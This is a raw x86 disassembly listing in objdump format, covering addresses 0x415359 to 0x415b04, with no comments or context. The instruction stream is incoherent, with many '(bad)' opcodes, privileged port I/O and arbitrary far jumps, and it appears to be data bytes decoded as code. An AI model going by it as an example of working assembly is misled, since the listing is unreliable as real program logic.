  415359:	imul   edx,DWORD PTR [ecx-0x53],0xc7cccdf9
  415360:	call   0xba5c8256
  415365:	sub    ecx,DWORD PTR [ecx]
  415367:	hlt    
  415368:	mov    dl,0xeb
  41536a:	push   ebp
  41536b:	push   ss
  41536c:	imul   esi,DWORD PTR [edx],0xffffffa2
  41536f:	imul   DWORD PTR [edx-0x22]
  415372:	outs   dx,BYTE PTR ds:[esi]
  415373:	xor    edx,DWORD PTR [ebx]
  415375:	std    
  415376:	rcl    edi,0x4a
  415379:	test   eax,0x2f5db1d
  41537e:	xchg   BYTE PTR ds:0xc70190b4,dl
  415384:	adc    eax,0x6014f0b1
  415389:	push   es
  41538a:	and    bh,BYTE PTR [esi+0x2fa55951]
  415390:	push   ebp
  415391:	mov    bh,0xf0
  415393:	push   esp
  415394:	sbb    DWORD PTR [edi],ebx
  415396:	cmp    cl,bh
  415398:	mul    DWORD PTR [edx-0x6a]
  41539b:	(bad)
  41539e:	lahf   
  41539f:	sbb    DWORD PTR [ecx+0x65],0x1
  4153a3:	out    0x6d,al
  4153a5:	test   cl,ch
  4153a7:	nop
  4153a8:	sbb    ch,BYTE PTR [eax-0x1f]
  4153ab:	cmp    cl,bh
  4153ad:	inc    esp
  4153ae:	or     al,0x57
  4153b0:	pop    ebx
  4153b1:	inc    esp
  4153b2:	and    edi,DWORD PTR [ebp-0x1a]
  4153b5:	mov    eax,DWORD PTR ds:0xf0bcf092
  4153bb:	nop    eax
  4153be:	(bad)  
  4153bf:	and    BYTE PTR [esi-0x64],0xf3
  4153c3:	inc    edi
  4153c4:	push   esi
  4153c5:	int    0x12
  4153c7:	clc    
  4153c8:	push   edi
  4153c9:	aam    0xe3
  4153cb:	add    edi,edx
  4153cd:	ror    DWORD PTR [edx+0xd],0x72
  4153d1:	sbb    DWORD PTR ds:0x1a0f2ba7,edi
  4153d7:	adc    DWORD PTR [ecx],esi
  4153d9:	fwait
  4153da:	shr    BYTE PTR [edx-0x2d699ca2],0x65
  4153e1:	sbb    edx,DWORD PTR [ecx]
  4153e3:	adc    eax,0x66eb5d05
  4153e8:	xchg   DWORD PTR [ecx],edx
  4153ea:	mov    cl,0xfd
  4153ec:	fcom   QWORD PTR [ecx+0xb]
  4153ef:	jg     0x415443
  4153f1:	ja     0x4153ca
  4153f3:	std    
  4153f4:	nop
  4153f5:	fidiv  DWORD PTR [eax-0x18]
  4153f8:	mov    ds:0x9ace170e,al
  4153fd:	outs   dx,BYTE PTR ds:[esi]
  4153fe:	add    ecx,DWORD PTR [esi+0x50516601]
  415404:	fisttp QWORD PTR [esi+0x6a]
  415407:	dec    esi
  415408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415409:	push   edx
  41540a:	in     eax,0xfe
  41540c:	rcr    BYTE PTR [eax],cl
  41540e:	xor    esp,DWORD PTR [ecx+eax*4+0x3e]
  415412:	in     al,dx
  415413:	xor    eax,0x14d5760d
  415418:	push   eax
  415419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41541a:	cmp    al,0xa5
  41541d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41541e:	mov    bh,0x95
  415420:	dec    edi
  415421:	ficom  DWORD PTR [ebx+0x12c62715]
  415427:	pop    es
  415428:	sbb    eax,0x79b99849
  41542d:	stos   BYTE PTR es:[edi],al
  41542e:	dec    esi
  41542f:	pop    ss
  415430:	jmp    0x4153e1
  415432:	lgs    edx,FWORD PTR [eax+0x72]
  415436:	cmp    DWORD PTR [edx-0x228e80bf],eax
  41543c:	cmp    DWORD PTR [ebx+0x66],ebp
  41543f:	mov    edx,DWORD PTR [ebx+0x16]
  415442:	cld    
  415443:	ror    BYTE PTR [ebp+eiz*1+0x3c],cl
  415447:	pop    ds
  415448:	sub    BYTE PTR [edi],bl
  41544a:	fst    QWORD PTR [eax]
  41544c:	shl    ch,0x6d
  41544f:	in     eax,0xa7
  415451:	xor    ch,BYTE PTR [edi+0x45]
  415454:	std    
  415455:	dec    ebp
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	jmp    0x415451
  415459:	pop    edx
  41545a:	dec    esp
  41545b:	xchg   BYTE PTR [ebx-0xfb86255],al
  415461:	addr16 das 
  415463:	lods   eax,DWORD PTR ds:[esi]
  415465:	push   eax
  415466:	sbb    eax,0xb7145a53
  41546b:	dec    edx
  41546c:	pop    ecx
  41546d:	mov    esi,0x3f0d5d7a
  415472:	xor    al,0x87
  415474:	push   ecx
  415475:	xor    BYTE PTR [edx+0x4c06c086],0x65
  41547c:	push   ss
  41547d:	lds    ebp,FWORD PTR ds:0xfbcff716
  415483:	jmp    0x20ec:0x92fb60b4
  41548a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41548b:	cmp    ah,BYTE PTR [eax-0xd]
  41548e:	retf   
  41548f:	dec    ebp
  415490:	mov    ds:0x701b6427,eax
  415495:	push   eax
  415496:	clc    
  415497:	cmp    DWORD PTR [ebp-0x63],esp
  41549a:	inc    esi
  41549b:	inc    ebp
  41549c:	cmp    eax,eax
  41549e:	cmp    edi,DWORD PTR [ebx]
  4154a0:	and    eax,0x474e3703
  4154a5:	fbld   TBYTE PTR [eax+0x51]
  4154a8:	ds adc eax,0xb7bf9965
  4154ae:	jmp    0xc9d3414b
  4154b3:	jg     0x41552d
  4154b5:	cs loopne 0x415468
  4154b8:	dec    eax
  4154b9:	mov    ecx,0x5c4cb8e2
  4154be:	jmp    0x9b53faae
  4154c3:	sti    
  4154c4:	int    0x81
  4154c6:	and    DWORD PTR [esi],ebx
  4154c8:	add    eax,0x4396ebfc
  4154cd:	jae    0x41547a
  4154cf:	inc    edi
  4154d0:	fwait
  4154d1:	arpl   WORD PTR [esi],cx
  4154d3:	rcr    edx,0xfd
  4154d6:	cmp    BYTE PTR [ebx+0x0],ch
  4154d9:	push   edx
  4154da:	call   0x155:0xd6fcb80
  4154e1:	call   0x61f0c8d9
  4154e6:	jnp    0x4154f9
  4154e8:	mov    esi,0x32cf36a7
  4154ed:	call   0xcd2d35d4
  4154f2:	sub    cl,bl
  4154f4:	(bad)
  4154f7:	mov    ah,BYTE PTR [edi+0x6d]
  4154fa:	push   ss
  4154fb:	fs aam 0xbe
  4154fe:	push   ebx
  4154ff:	ins    DWORD PTR es:[edi],dx
  415500:	xchg   ebp,eax
  415501:	or     DWORD PTR [eax+0x1c],0x4ecc0a67
  415508:	or     eax,0x755e23c7
  41550d:	jg     0x4154c1
  41550f:	sub    DWORD PTR [ebx],eax
  415511:	or     DWORD PTR [edx],ebp
  415513:	adc    sp,si
  415516:	mov    esp,0xd9070b2c
  41551b:	mov    dh,0x89
  41551d:	sub    eax,0xd10e5376
  415522:	sub    al,0xac
  415524:	mov    ds:0xf9f0f99d,eax
  415529:	cwde   
  41552a:	pop    ecx
  41552b:	and    DWORD PTR [ecx+esi*1],0x4e
  41552f:	mov    ebx,0x7d7dd5b
  415534:	in     al,dx
  415535:	ficomp WORD PTR ds:0xfe78a25e
  41553b:	outs   dx,DWORD PTR ds:[esi]
  41553c:	mov    ah,0xed
  41553e:	(bad)  
  41553f:	or     eax,0xf1603148
  415544:	cmp    BYTE PTR [edx-0xc88c624],al
  41554a:	pop    eax
  41554b:	mov    edx,0x2e28867e
  415550:	adc    eax,0x88a0dc59
  415555:	adc    al,0x55
  415557:	jnp    0x4155c6
  415559:	aad    0x29
  41555b:	out    0x2e,eax
  41555d:	and    esi,ebp
  41555f:	in     al,dx
  415560:	(bad)  
  415561:	xor    bl,BYTE PTR [esi+0x44]
  415564:	mov    ch,0xb9
  415566:	sbb    cl,0xdc
  415569:	inc    esp
  41556a:	dec    edi
  41556b:	pop    es
  41556c:	pusha  
  41556d:	fisttp WORD PTR [ecx-0x2b035446]
  415573:	sub    al,0x18
  415575:	repnz inc ebp
  415577:	popa   
  415578:	dec    ebx
  415579:	in     al,dx
  41557a:	and    DWORD PTR [ebx],ebp
  41557c:	aas    
  41557d:	in     al,0xab
  41557f:	inc    esp
  415580:	mov    ah,0x91
  415582:	ins    DWORD PTR es:[edi],dx
  415583:	(bad)  
  415584:	(bad)  
  415585:	jmp    FWORD PTR [ebp-0x70]
  415588:	stc    
  415589:	ret    
  41558a:	mov    ss,ebx
  41558c:	cmc    
  41558d:	inc    edi
  41558e:	fcom   QWORD PTR [ebp+0x3c]
  415591:	lds    eax,FWORD PTR [edi]
  415593:	push   ds
  415594:	in     al,dx
  415595:	push   edx
  415596:	(bad)  
  415597:	pushf  
  415598:	sbb    ebp,ecx
  41559a:	lods   al,BYTE PTR ds:[esi]
  41559b:	adc    DWORD PTR [ebx+eiz*1-0x6a69c2d7],edi
  4155a2:	mov    bh,0x56
  4155a4:	loope  0x4155eb
  4155a6:	fnsave ds:[eax]
  4155a9:	dec    ecx
  4155aa:	mov    ebp,fs
  4155ac:	cli    
  4155ad:	dec    esi
  4155ae:	or     eax,edx
  4155b0:	adc    edx,DWORD PTR [ebx+0x52]
  4155b3:	pop    edi
  4155b4:	and    eax,DWORD PTR [ebp+0x5f43d08c]
  4155ba:	ja     0x4155f9
  4155bc:	sti    
  4155bd:	popa   
  4155be:	dec    esp
  4155bf:	xor    DWORD PTR [esi+0x783978fa],0x96e8f88f
  4155c9:	sub    BYTE PTR [edi-0x33],dh
  4155cc:	sub    DWORD PTR [ecx+0x2a],ebp
  4155cf:	fscale 
  4155d1:	retf   
  4155d2:	cmp    DWORD PTR [edx+eax*2+0x2b],ebp
  4155d6:	out    0x21,eax
  4155d8:	int3   
  4155d9:	sbb    edx,DWORD PTR [ebp-0x1c]
  4155dc:	jbe    0x415599
  4155de:	mov    dl,0xf3
  4155e0:	jle    0x4155b9
  4155e2:	fs in  al,0x20
  4155e5:	xchg   esi,eax
  4155e6:	push   ecx
  4155e7:	mov    BYTE PTR [eax+0x44],dh
  4155ea:	pop    ss
  4155eb:	xchg   edx,eax
  4155ec:	jmp    0x415605
  4155ee:	mov    al,0x97
  4155f0:	scas   al,BYTE PTR es:[edi]
  4155f1:	pop    edi
  4155f2:	mov    ds:0x665447b6,eax
  4155f7:	fld    TBYTE PTR [esi-0x4c]
  4155fb:	(bad)  
  4155fc:	mov    ebp,0xfe6b415e
  415601:	retf   0xedcc
  415604:	pop    ds
  415605:	test   al,0x34
  415607:	xlat   BYTE PTR ds:[ebx]
  415608:	jmp    0x415640
  41560a:	dec    edx
  41560b:	fcmovne st,st(7)
  41560d:	retf   
  41560e:	xor    DWORD PTR [edi+0x6e],ecx
  415611:	sbb    al,0x84
  415613:	jl     0x4155a4
  415615:	clc    
  415616:	iret   
  415617:	or     cl,BYTE PTR [ebp+0x4e]
  41561a:	jb     0x415687
  41561c:	stc    
  41561d:	mov    esi,0xefc39565
  415622:	popf   
  415623:	sti    
  415624:	ins    DWORD PTR es:[edi],dx
  415625:	jmp    0x4155e3
  415627:	push   ecx
  415628:	shl    esp,0x59
  41562b:	dec    ebp
  41562c:	in     eax,dx
  41562d:	ins    DWORD PTR es:[edi],dx
  41562e:	sub    ch,dh
  415630:	scas   al,BYTE PTR es:[edi]
  415631:	xor    ebp,DWORD PTR [eax+0x1a]
  415634:	stc    
  415635:	ds sahf 
  415637:	(bad)  
  415638:	sbb    dh,BYTE PTR [esp+edi*1+0x5b065367]
  41563f:	cwde   
  415640:	imul   edi,DWORD PTR [edi-0x21],0x24cc9029
  415647:	retfw  0x9ed
  41564b:	mov    bl,0x68
  41564d:	outs   dx,BYTE PTR ds:[esi]
  41564e:	mov    edi,0x9bd6b238
  415653:	ins    BYTE PTR es:[edi],dx
  415654:	sti    
  415655:	cmc    
  415656:	push   es
  415657:	test   eax,0x540c2018
  41565c:	mov    ecx,DWORD PTR [esp+ebp*8+0xb]
  415660:	fisub  WORD PTR [esi-0x41a040fd]
  415666:	adc    al,BYTE PTR [esp+ecx*4-0x70]
  41566a:	adc    BYTE PTR [eax],dl
  41566c:	jne    0x4156ed
  41566e:	mov    eax,0xbd5614bd
  415673:	jbe    0x4156e8
  415675:	shl    cl,0x48
  415678:	repz pop edi
  41567a:	jnp    0x415642
  41567c:	cwde   
  41567d:	dec    esp
  41567e:	enter  0x84dd,0x84
  415682:	int    0x3a
  415684:	xchg   ebp,eax
  415685:	jbe    0x4156d9
  415687:	push   es
  415688:	or     BYTE PTR [eax+0x5bb06d00],bh
  41568e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  415690:	jns    0x415650
  415692:	(bad)  
  415693:	cmp    al,0xde
  415695:	dec    ecx
  415696:	push   es
  415697:	data16 cmp BYTE PTR [eax-0x13],bl
  41569b:	cld    
  41569c:	imul   edx,DWORD PTR [ecx+0x627cfb03],0x20
  4156a3:	and    al,0x38
  4156a5:	ss ret 0x78c3
  4156a9:	cmp    al,0x1b
  4156ab:	inc    eax
  4156ac:	mov    dh,0x95
  4156ae:	retf   
  4156af:	push   edx
  4156b0:	adc    al,0xf0
  4156b2:	aam    0x92
  4156b4:	xchg   BYTE PTR [ebx],bh
  4156b6:	je     0x4156a2
  4156b8:	ficomp DWORD PTR [edi]
  4156ba:	aad    0x56
  4156bc:	sbb    BYTE PTR [ebp+0x13],0xda
  4156c0:	jl     0x4156c5
  4156c2:	xchg   ebx,eax
  4156c3:	(bad)  
  4156c4:	out    0xd4,eax
  4156c6:	sti    
  4156c7:	addr16 imul esp,edx,0xffffffca
  4156cb:	sub    bl,BYTE PTR [edx-0x65135279]
  4156d1:	mov    eax,0xe485441c
  4156d6:	cwde   
  4156d7:	repz data16 fwait
  4156da:	push   edi
  4156db:	hlt    
  4156dc:	sahf   
  4156dd:	sub    ecx,DWORD PTR [ebp-0x40]
  4156e0:	stos   BYTE PTR es:[edi],al
  4156e1:	and    bh,ch
  4156e3:	es sub al,0x7
  4156e6:	sub    bh,BYTE PTR [esi-0x3233d043]
  4156ec:	jnp    0x4156fb
  4156ee:	stc    
  4156ef:	and    ah,ah
  4156f1:	inc    esp
  4156f2:	addr16 call 0xaf08a3d9
  4156f8:	mov    dl,BYTE PTR [edx+0x18]
  4156fb:	out    dx,al
  4156fc:	fnstcw WORD PTR [ebp-0x568e2645]
  415702:	mov    BYTE PTR [ecx-0x5c1e5df4],al
  415708:	(bad)  
  415709:	enter  0x5228,0x16
  41570d:	imul   edx,DWORD PTR [eax-0x62],0x26
  415711:	into   
  415712:	ret    0x93b5
  415715:	add    BYTE PTR [eax+0x60],al
  415718:	ret    
  415719:	pop    ebx
  41571a:	in     eax,dx
  41571b:	sub    al,0x98
  41571d:	(bad)  
  41571e:	mov    dl,BYTE PTR [esi-0x31]
  415721:	out    0x20,eax
  415723:	mov    BYTE PTR [eax+edx*1+0x33968707],ah
  41572a:	push   edi
  41572b:	mov    ch,0x1a
  41572d:	pop    ds
  41572e:	(bad)  
  41572f:	jmp    0x7e2a:0xee088ba8
  415736:	inc    edx
  415737:	or     eax,0xe7f137f7
  41573c:	dec    ebx
  41573d:	fmul   QWORD PTR [eax-0xf]
  415740:	(bad)  
  415741:	or     al,0x1d
  415743:	mov    ch,0x94
  415745:	pop    esp
  415746:	adc    dh,BYTE PTR [edx+0x4e]
  415749:	inc    edi
  41574a:	pop    eax
  41574b:	push   ebp
  41574c:	push   esi
  41574d:	jge    0x415780
  41574f:	fild   WORD PTR [eax]
  415751:	jo     0x415709
  415753:	es and al,0x67
  415756:	fst    QWORD PTR [edi+0x7dd3c7ac]
  41575c:	or     eax,0x280e2dde
  415761:	ss stos DWORD PTR es:[edi],eax
  415763:	pusha  
  415764:	cmp    DWORD PTR [ebp+ecx*8+0x7e0374cd],ecx
  41576b:	add    eax,0x62c142f6
  415770:	ja     0x415799
  415772:	aam    0x4b
  415774:	lahf   
  415775:	and    eax,0xa9651ba9
  41577a:	mov    edi,edi
  41577c:	and    eax,0x8e2511b4
  415781:	mov    edx,0x34fb551
  415786:	in     al,0xbb
  415788:	scas   eax,DWORD PTR es:[edi]
  415789:	ja     0x415790
  41578b:	jge    0x4157bc
  41578d:	mov    esi,0x2dc7d918
  415792:	inc    ebx
  415793:	mov    ds:0x14a3739,eax
  415798:	ror    BYTE PTR [ecx+0xf6a2268],1
  41579e:	call   0xc02ff01a
  4157a3:	cmc    
  4157a4:	rcr    BYTE PTR [esi],cl
  4157a6:	mov    cl,0xfa
  4157a8:	cdq    
  4157a9:	add    BYTE PTR [eax+0x6b],al
  4157ac:	xor    BYTE PTR [ebx-0x42],al
  4157af:	in     al,0x49
  4157b1:	stc    
  4157b2:	(bad)  
  4157b3:	push   eax
  4157b4:	sbb    al,0x6c
  4157b6:	jno    0x4157a7
  4157b8:	cmp    esp,eax
  4157ba:	pop    esp
  4157bb:	add    al,0xbd
  4157bd:	mov    dh,0xf4
  4157bf:	stos   DWORD PTR es:[edi],eax
  4157c0:	lahf   
  4157c1:	inc    edi
  4157c2:	mov    edi,0xc4644037
  4157c7:	xchg   ebp,eax
  4157c8:	mov    ebp,0xba517b0c
  4157cd:	dec    ecx
  4157ce:	mov    esp,0xfb1ab508
  4157d3:	xor    DWORD PTR [ebx],esi
  4157d5:	ficomp WORD PTR [eax+0x35]
  4157d8:	push   ds
  4157d9:	dec    ecx
  4157da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157db:	push   esp
  4157dc:	ret    
  4157dd:	imul   esp,DWORD PTR [esi+0x604e1dae],0xffffffa3
  4157e4:	inc    ebp
  4157e5:	cmc    
  4157e6:	jp     0x41581f
  4157e8:	xlat   BYTE PTR ds:[ebx]
  4157e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157ea:	push   esp
  4157eb:	(bad)  
  4157ec:	iret   
  4157ed:	inc    esp
  4157ee:	fs scas eax,DWORD PTR es:[edi]
  4157f0:	out    0xd2,al
  4157f2:	adc    dh,ch
  4157f4:	mov    ebp,0x4977da78
  4157f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157fa:	mov    DWORD PTR [ebp+ebx*8-0xcb21a1f],esi
  415801:	stos   DWORD PTR es:[edi],eax
  415802:	scas   eax,DWORD PTR es:[edi]
  415803:	jo     0x4157b3
  415805:	leave  
  415806:	iret   
  415807:	loop   0x4157cb
  415809:	ins    BYTE PTR es:[edi],dx
  41580a:	fldenv [esi-0x2efefb05]
  415810:	in     al,0xc8
  415812:	dec    esi
  415813:	(bad)  
  415814:	jns    0x4157c3
  415816:	pop    es
  415817:	xchg   ebp,eax
  415818:	inc    ecx
  415819:	or     al,0x1d
  41581b:	mov    ch,0xdf
  41581d:	mov    bl,0x3b
  41581f:	inc    eax
  415820:	push   ds
  415821:	ficom  DWORD PTR [eax-0x5d]
  415824:	inc    eax
  415825:	lahf   
  415826:	cs pushf 
  415828:	sub    bl,cl
  41582a:	dec    ecx
  41582b:	cmp    ch,dl
  41582d:	jno    0x4157eb
  41582f:	inc    edi
  415830:	mov    eax,ds:0xd4975d3b
  415835:	(bad)  
  415836:	xchg   edx,eax
  415837:	not    DWORD PTR [ebx+0x3e10e12]
  41583d:	jns    0x415816
  41583f:	and    al,0x41
  415841:	mov    edx,DWORD PTR [eax-0x48]
  415844:	inc    esi
  415845:	inc    ebp
  415846:	pop    edx
  415847:	retf   
  415848:	mov    es,esp
  41584a:	and    dh,BYTE PTR [edi+0x4f42e378]
  415850:	push   ss
  415851:	jno    0x41585e
  415853:	pusha  
  415854:	int3   
  415855:	adc    dl,BYTE PTR [edx-0x1049486f]
  41585b:	push   ebp
  41585c:	add    eax,0x517a1d22
  415861:	inc    esp
  415862:	cmp    al,0xfd
  415864:	jne    0x415879
  415866:	hlt    
  415867:	mov    ss,WORD PTR [edx-0x53]
  41586a:	xor    eax,0xd4f5a560
  41586f:	xchg   esp,eax
  415870:	xlat   BYTE PTR ds:[ebx]
  415871:	mov    bl,BYTE PTR [edi+ebx*8-0x1c]
  415875:	adc    edi,edx
  415877:	call   0xf9a1:0x840dbbd2
  41587e:	adc    bl,ah
  415880:	adc    dh,al
  415882:	mov    ah,0x8
  415884:	push   es
  415885:	xchg   DWORD PTR [ebx-0x557ec1de],eax
  41588b:	inc    ebx
  41588c:	mov    ebp,0x67fdef1b
  415891:	mov    ebx,0xac28cd7
  415896:	dec    ecx
  415897:	inc    esp
  415898:	std    
  415899:	(bad)  
  41589a:	pop    edx
  41589b:	pop    es
  41589c:	sbb    eax,0xd3c6d51f
  4158a1:	mov    ecx,0x3b18bc3
  4158a6:	add    ax,0xf0c2
  4158aa:	or     BYTE PTR [ebx],ch
  4158ac:	xor    eax,ebp
  4158ae:	jns    0x415837
  4158b0:	jo     0x4158c6
  4158b2:	or     ecx,esi
  4158b4:	loop   0x4158dd
  4158b6:	pop    es
  4158b7:	iret   
  4158b8:	mov    DWORD PTR ds:0xabb4d88e,esi
  4158be:	adc    edx,eax
  4158c0:	sub    al,0x35
  4158c2:	outs   dx,BYTE PTR ds:[esi]
  4158c3:	mov    ebx,0x74aac127
  4158c8:	cld    
  4158c9:	fs adc ax,0x3c02
  4158ce:	(bad)  
  4158cf:	push   cs
  4158d0:	mov    esi,edi
  4158d2:	add    BYTE PTR [eax-0x3fc7ade8],al
  4158d8:	inc    eax
  4158d9:	popf   
  4158da:	pop    edi
  4158db:	out    dx,eax
  4158dc:	std    
  4158dd:	jns    0x415862
  4158df:	pop    ds
  4158e0:	loop   0x41591b
  4158e2:	mov    al,0xa5
  4158e4:	xor    DWORD PTR [edi+0x32],eax
  4158e7:	retf   
  4158e8:	dec    ebx
  4158e9:	add    BYTE PTR [esi+0x51],0x6f
  4158ed:	push   cs
  4158ee:	mov    gs,WORD PTR [edx-0x10]
  4158f1:	xchg   esi,eax
  4158f2:	xor    eax,0xec259e9c
  4158f7:	cmp    DWORD PTR [edi],esi
  4158f9:	ins    DWORD PTR es:[edi],dx
  4158fa:	imul   ecx,DWORD PTR [ebp-0x13],0xffffffce
  4158fe:	pop    ss
  4158ff:	dec    esi
  415900:	dec    esp
  415901:	xor    DWORD PTR [edx+0x154e4bd8],ebx
  415907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415908:	lock scas al,BYTE PTR es:[edi]
  41590a:	das    
  41590b:	jnp    0x415909
  41590d:	xor    al,0x6f
  41590f:	leave  
  415910:	sahf   
  415911:	aam    0x12
  415913:	jp     0x41597f
  415915:	push   0xb5d566ff
  41591a:	sbb    esp,DWORD PTR [edx]
  41591c:	pop    ss
  41591d:	lods   al,BYTE PTR ds:[esi]
  41591e:	daa    
  41591f:	sbb    al,0xb8
  415921:	and    DWORD PTR [eax],esp
  415923:	mov    ebx,0xd390fd29
  415928:	xor    al,0xd2
  41592a:	cmp    al,BYTE PTR [edi+0x4a]
  41592d:	jg     0x415994
  41592f:	or     al,0xbc
  415931:	out    dx,eax
  415932:	out    dx,eax
  415933:	arpl   WORD PTR [esi+0x4c],bp
  415936:	cdq    
  415937:	sub    BYTE PTR [esi+0x1c5eb27f],ah
  41593d:	dec    esi
  41593e:	lods   eax,DWORD PTR ds:[esi]
  41593f:	xchg   ebp,eax
  415940:	and    al,0x85
  415942:	push   ebp
  415943:	cmp    eax,0x10b9d02c
  415948:	mov    bh,0x88
  41594a:	mov    edi,DWORD PTR [edx+edi*8-0xef00193]
  415951:	lods   al,BYTE PTR ds:[esi]
  415952:	adc    dh,bh
  415954:	ret    
  415955:	ret    0x7995
  415958:	jb     0x4158e8
  41595a:	jb     0x41592c
  41595c:	jmp    0x8b75:0xbf23c3d1
  415963:	dec    BYTE PTR [edi+0x1da3b6de]
  415969:	jmp    0xf263:0xde513b3a
  415970:	or     DWORD PTR [edx-0x34fd861d],0x6
  415977:	jbe    0x415935
  415979:	pop    eax
  41597a:	fidiv  DWORD PTR [ecx+0x15]
  41597d:	mov    dh,0xd4
  41597f:	dec    ebp
  415980:	fcmovb st,st(5)
  415982:	jecxz  0x4159cd
  415984:	retf   
  415985:	sub    DWORD PTR [eax],edi
  415987:	mov    bh,0x9a
  415989:	pop    edi
  41598a:	sbb    eax,0xcf5e304d
  41598f:	or     ah,dl
  415991:	in     eax,0x88
  415993:	xchg   edi,eax
  415994:	es xchg esp,eax
  415996:	mov    DWORD PTR [ecx-0x75],esp
  415999:	out    0xc0,eax
  41599b:	push   ds
  41599c:	aaa    
  41599d:	inc    ebp
  41599e:	int    0x2
  4159a0:	push   esi
  4159a1:	lods   al,BYTE PTR ds:[esi]
  4159a2:	mov    al,ds:0x335a4da2
  4159a7:	mov    WORD PTR [eax+0x14e1f10b],es
  4159ad:	push   es
  4159ae:	inc    ebx
  4159af:	pop    ss
  4159b0:	aad    0x7
  4159b2:	xor    al,ch
  4159b4:	(bad)  
  4159b5:	cwde   
  4159b6:	stos   BYTE PTR es:[edi],al
  4159b7:	sbb    eax,0x5d7a0824
  4159bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159bd:	sbb    dl,ch
  4159bf:	adc    DWORD PTR [edx-0x16969b56],esi
  4159c5:	pop    eax
  4159c6:	add    DWORD PTR [ecx+0x60],ebx
  4159c9:	mov    ds:0x17eeff5f,al
  4159ce:	in     al,dx
  4159cf:	aas    
  4159d0:	loopne 0x415993
  4159d2:	push   ss
  4159d3:	add    eax,0x44ed6666
  4159d8:	xor    DWORD PTR [ebp-0x68b31729],edx
  4159de:	arpl   si,si
  4159e0:	jl     0x415a2c
  4159e2:	adc    eax,0xc104b515
  4159e7:	mov    BYTE PTR [ebx],ch
  4159e9:	cmp    eax,DWORD PTR [ebx-0x5f282a31]
  4159ef:	out    dx,eax
  4159f0:	or     DWORD PTR [bp+si+0x2a1f],esp
  4159f5:	jno    0x415a76
  4159f7:	push   0x629a5ba9
  4159fc:	xchg   ebp,eax
  4159fd:	clc    
  4159fe:	stos   BYTE PTR es:[edi],al
  4159ff:	pusha  
  415a00:	jecxz  0x4159d6
  415a02:	gs xchg edx,eax
  415a04:	aas    
  415a05:	mov    edi,0x5a57a0c8
  415a0a:	or     ebx,esi
  415a0c:	xchg   esi,eax
  415a0d:	into   
  415a0e:	loope  0x415a7f
  415a10:	stos   BYTE PTR es:[edi],al
  415a11:	cmp    bl,bl
  415a13:	or     BYTE PTR fs:[ecx+0x61],0xf9
  415a18:	dec    ecx
  415a19:	mov    ah,0x79
  415a1b:	jne    0x415a2d
  415a1d:	neg    DWORD PTR [esi-0x41]
  415a20:	stos   DWORD PTR es:[edi],eax
  415a21:	xchg   ebp,eax
  415a22:	frstor [edi+0x8]
  415a25:	nop
  415a26:	jg     0x415a13
  415a28:	bound  ebp,QWORD PTR [ecx+0x74]
  415a2b:	fisttp WORD PTR [ebx-0x7fc83bdf]
  415a31:	or     al,0x86
  415a33:	test   al,0x6d
  415a35:	and    al,0x58
  415a37:	fimul  WORD PTR [esi-0x13]
  415a3a:	cmp    dh,BYTE PTR [esi]
  415a3c:	cs sti 
  415a3e:	outs   dx,BYTE PTR ds:[esi]
  415a3f:	pusha  
  415a40:	psubq  mm6,mm7
  415a43:	add    al,ah
  415a45:	out    dx,al
  415a46:	fst    QWORD PTR [ebx-0x55]
  415a49:	and    ebp,DWORD PTR [ecx]
  415a4b:	ss sti 
  415a4d:	sbb    al,0xc0
  415a4f:	xchg   ecx,eax
  415a50:	data16 jb 0x415ac1
  415a53:	ror    DWORD PTR [edx],1
  415a55:	imul   ecx,DWORD PTR [esi],0xb6b832b4
  415a5b:	mov    eax,ds:0x57457517
  415a60:	pusha  
  415a61:	ret    0xac77
  415a64:	loop   0x415ad4
  415a66:	lds    eax,FWORD PTR [eax+ebp*4]
  415a69:	inc    esi
  415a6a:	xor    eax,0xecb66186
  415a6f:	enter  0x1f5b,0xde
  415a73:	lea    edi,[edi]
  415a75:	pop    ds
  415a76:	adc    DWORD PTR [edx+0x555fe2c1],esi
  415a7c:	lods   al,BYTE PTR ds:[esi]
  415a7d:	xor    eax,0x7c18ff9c
  415a82:	mov    eax,0xa46e5ce0
  415a87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a88:	shl    bl,0xb6
  415a8b:	push   es
  415a8c:	iret   
  415a8d:	push   ebx
  415a8e:	pop    ebp
  415a8f:	ins    BYTE PTR es:[edi],dx
  415a90:	mov    es,WORD PTR [ebx+0x53102498]
  415a96:	in     al,0xad
  415a98:	mov    WORD PTR [edx],ss
  415a9a:	mov    WORD PTR [ecx],ds
  415a9c:	mov    ecx,0x2e4d30aa
  415aa1:	vpsubd xmm2,xmm0,XMMWORD PTR [eax]
  415aa5:	icebp  
  415aa6:	jg     0x415a5a
  415aa8:	inc    eax
  415aa9:	sub    al,0xff
  415aab:	or     eax,0x2b36f374
  415ab0:	inc    ebp
  415ab1:	int    0x63
  415ab3:	sbb    ebx,DWORD PTR [esi+0x3d30b738]
  415ab9:	xchg   ebp,eax
  415aba:	sub    ch,dh
  415abc:	arpl   bx,sp
  415abe:	cmp    al,0x39
  415ac0:	add    al,0xd1
  415ac2:	std    
  415ac3:	into   
  415ac4:	push   esp
  415ac5:	sar    DWORD PTR [ebp+0x30],1
  415ac8:	add    eax,0x4251b94
  415acd:	test   BYTE PTR [ebp+ebx*8+0x4f7ed752],dl
  415ad4:	jae    0x415ae7
  415ad6:	cmp    DWORD PTR [edx-0x3e],0xffffffdd
  415ada:	cmp    bl,BYTE PTR [edx+0x11871618]
  415ae0:	pop    ds
  415ae1:	imul   edi,DWORD PTR [ecx+0x53],0x4e1361f5
  415ae8:	and    ebp,0xffffff95
  415aeb:	sbb    ah,BYTE PTR [ecx+0x69]
  415aee:	mov    esi,0x5dbe1d23
  415af3:	mov    edi,0x8e05f509
  415af8:	or     bh,al
  415afa:	jmp    0x415b49
  415afc:	out    0x99,eax
  415afe:	(bad)  
  415b00:	cmp    DWORD PTR [eax+edx*1],0xffffffb8
  415b04:	test   eax,0x12fb1cc2
